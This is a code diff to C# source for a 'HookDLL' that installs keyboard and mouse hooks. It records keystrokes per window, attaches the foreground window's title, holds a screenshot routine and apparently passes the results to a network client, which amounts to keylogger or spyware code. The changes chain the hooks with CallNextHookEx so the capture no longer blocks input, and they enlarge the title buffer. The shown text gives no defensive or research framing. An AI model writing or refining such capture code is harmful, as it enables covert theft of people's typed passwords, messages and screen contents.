@@ -16,6 +16,7 @@ namespace HookDLL
         Dictionary<IntPtr, string> keys ;
         KeysConverter keysConverter;
         Client client;
+        public IntPtr hookKeyId, hookMouseId;
 
         public  HookProceduces()
         {
@@ -61,7 +62,7 @@ namespace HookDLL
                     }
                 }
             }
-            return IntPtr.Zero;
+            return CallNextHookEx(hookKeyId, nCode, wParam, lParam);
         }
         #endregion
 
@@ -98,7 +99,7 @@ namespace HookDLL
                 }
 
             }
-            return IntPtr.Zero;
+            return CallNextHookEx(hookMouseId, nCode, wParam, lParam);
         }
         #endregion
 
@@ -109,7 +110,7 @@ namespace HookDLL
             
             if (keys.ContainsKey(p))
             {
-                StringBuilder name = new StringBuilder(20);
+                StringBuilder name = new StringBuilder(100);
                 GetWindowText(p, name, name.Capacity);
                 string transferString = keys[p]+"/"+ name;
                 keys.Remove(p);
@@ -122,6 +123,9 @@ namespace HookDLL
         private static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
 
         private Bitmap PrintScreen()
         {
